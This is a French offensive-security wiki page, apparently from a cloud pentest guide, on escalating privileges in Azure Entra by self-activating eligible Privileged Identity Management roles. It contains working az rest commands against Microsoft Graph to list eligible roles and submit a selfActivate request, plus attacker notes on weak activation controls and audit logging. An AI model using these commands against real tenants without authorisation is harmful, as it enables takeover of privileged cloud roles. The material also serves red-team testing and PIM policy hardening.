---
title: "PIM : activer les rôles privilégiés éligibles"
order: 2
description: "Abuser de Privileged Identity Management : activer des rôles éligibles, exploiter une approbation d'activation faible, et les attributions éligibles permanentes pour une élévation juste-à-temps."
keywords:
  - PIM
  - Privileged Identity Management
  - rôle éligible
  - activation
  - juste-à-temps
---

# PIM

Privileged Identity Management rend les rôles privilégiés **éligibles** plutôt que définitivement actifs : un principal active le rôle juste à temps. Lorsque vous compromettez un compte éligible à un rôle puissant, l'activation est souvent tout ce qui vous sépare de ce rôle, et les contrôles d'activation (MFA, approbation, justification) sont fréquemment faibles ou non configurés.

## Activer un rôle éligible

```bash
# list your eligible role assignments, then self-activate
az rest --method GET --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances?\$filter=principalId eq '<you>'"
az rest --method POST \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" \
  --body '{"action":"selfActivate","principalId":"<you>","roleDefinitionId":"<role>","directoryScopeId":"/","justification":"x"}'
```

## Notes d'exploitation

- L'éligibilité est une élévation permanente : un compte éligible compromis devient le rôle à la demande, de sorte que l'éligibilité importe autant que l'attribution active lors de la cartographie des cibles.
- Une activation qui ne requiert qu'une justification (sans MFA, sans approbation) est une élévation en self-service ; vérifiez la politique avant de supposer une barrière.
- Les activations sont limitées dans le temps et journalisées, opérez donc dans la fenêtre et attendez-vous à l'événement d'activation dans le journal d'audit.

## Outils

- **az cli** / **Graph** (`roleAssignmentScheduleRequests`).
- **AzureHound** : fait apparaître les arêtes de rôles éligibles.

## Références

- [SpecterOps : AzureHound PIM edges](https://github.com/BloodHoundAD/AzureHound)
- [HackTricks Cloud : PIM](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft : PIM for Entra roles](https://learn.microsoft.com/entra/id-governance/privileged-identity-management/pim-configure)
